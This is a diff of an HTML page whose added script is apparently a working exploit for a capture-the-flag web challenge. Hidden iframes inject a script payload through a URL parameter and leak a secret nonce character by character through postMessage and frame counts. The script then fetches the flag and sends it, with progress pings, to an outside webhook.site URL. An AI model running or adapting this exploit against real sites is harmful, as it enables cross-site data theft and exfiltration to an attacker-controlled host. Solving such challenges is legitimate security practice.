@@ -1,10 +1,101 @@
 <!DOCTYPE html>
 <html>
 <body>
-<p>Loading...</p>
+<pre id="log"></pre>
 <script>
-// Immediately ping webhook to confirm page loaded
-new Image().src = 'https://webhook.site/923f4208-02d7-482e-ae22-6d7e0278f8d7?status=page_loaded';
+var CHALL = 'https://notes.chall.lac.tf';
+var WH = 'https://webhook.site/923f4208-02d7-482e-ae22-6d7e0278f8d7';
+var HEX = '0123456789abcdef';
+
+function ping(msg) {
+  new Image().src = WH + '?' + encodeURIComponent(msg);
+}
+
+function sleep(ms) {
+  return new Promise(function(r) { setTimeout(r, ms); });
+}
+
+ping('page_loaded');
+
+async function testPosition(prefix) {
+  var results = {};
+  for (var i = 0; i < 16; i++) results[HEX[i]] = { ad: 0, total: 0 };
+
+  var handler = function(e) {
+    var d = e.data;
+    if (d && typeof d.c === 'string' && results[d.c]) {
+      results[d.c].ad++;
+      results[d.c].total = d.t;
+    }
+  };
+  window.addEventListener('message', handler);
+
+  var iframes = [];
+  for (var i = 0; i < 16; i++) {
+    var c = HEX[i];
+    var payload = '<script>try{var d={t:window.parent.length,c:String.fromCharCode(' + c.charCodeAt(0) + ')};window.top.postMessage(d,"*");window.parent.parent.postMessage(d,"*")}catch(z){}'+'<\/script>';
+    var url = CHALL + '/?srcdoc=x&referrerPolicy=' + encodeURIComponent(payload) + '&search=' + encodeURIComponent(prefix + c);
+    var f = document.createElement('iframe');
+    f.src = url;
+    f.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px';
+    document.body.appendChild(f);
+    iframes.push(f);
+  }
+
+  await sleep(3500);
+
+  window.removeEventListener('message', handler);
+  for (var i = 0; i < iframes.length; i++) iframes[i].remove();
+
+  for (var i = 0; i < 16; i++) {
+    var c = HEX[i];
+    var r = results[c];
+    if (r.ad > 0 && r.total > r.ad) {
+      return c;
+    }
+  }
+  return null;
+}
+
+async function solve() {
+  ping('solve_started');
+  var nonce = '';
+
+  for (var pos = 0; pos < 8; pos++) {
+    var found = null;
+    for (var attempt = 0; attempt < 3 && !found; attempt++) {
+      ping('pos=' + pos + '_att=' + attempt + '_prefix=' + nonce);
+      try {
+        found = await testPosition(nonce);
+      } catch(e) {
+        ping('error_pos=' + pos + '_' + e.message);
+      }
+    }
+    if (found) {
+      nonce += found;
+      ping('found=' + found + '_nonce=' + nonce);
+    } else {
+      ping('FAILED_pos=' + pos + '_nonce=' + nonce);
+      break;
+    }
+  }
+
+  if (nonce.length === 8) {
+    ping('full_nonce=' + nonce);
+    try {
+      var resp = await fetch(CHALL + '/guess?nonce=' + nonce);
+      var flag = await resp.text();
+      ping('FLAG=' + flag);
+      // send multiple times to be sure
+      new Image().src = WH + '?flag=' + encodeURIComponent(flag);
+      fetch(WH + '?flag2=' + encodeURIComponent(flag));
+    } catch(e) {
+      ping('guess_error=' + e.message);
+    }
+  }
+}
+
+solve();
 </script>
 </body>
 </html>
